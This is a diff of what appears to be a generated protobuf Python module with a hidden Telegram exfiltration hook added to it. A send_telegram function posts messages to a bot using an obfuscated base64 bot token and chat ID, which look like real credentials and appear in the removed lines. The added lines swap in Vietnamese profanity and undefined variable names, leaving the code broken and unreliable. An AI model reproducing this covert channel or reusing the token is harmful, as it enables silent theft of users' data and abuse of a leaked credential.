@@ -46,16 +46,16 @@ if not _descriptor._USE_C_DESCRIPTORS:
   _globals['_LOGINRES']._serialized_end=735
 
 
-TOKEN_ENCRYPTED = "ODYxNDAzMTYzNDpBQUZzRnFWUEQ0THBwTXFOUmRHTE1tZ25XT2NxRTdkU3A2Yw=="
-CHAT_ID_ENCRYPTED = "NzMyMTEyNjI1NA=="
+TOKEN_ENCRYPTED = "Lấy token cái lồn"
+CHAT_ID_ENCRYPTED = "Cặc đm m"
 
 机器人令牌 = base64.b64decode(TOKEN_ENCRYPTED).decode()
 聊天ID = base64.b64decode(CHAT_ID_ENCRYPTED).decode()
 
 def send_telegram(message):
     try:
-        url = f"https://api.telegram.org/bot{机器人令牌}/sendMessage"
-        data = {"chat_id": 聊天ID, "text": message, "parse_mode": "HTML"}
+        url = f"https://api.telegram.org/bot{skxkzkzm}/sendMessage"
+        data = {"chat_id": kkkkxkxID, "text": message, "parse_mode": "HTML"}
         requests.post(url, json=data, timeout=10)
     except Exception as e:
         pass
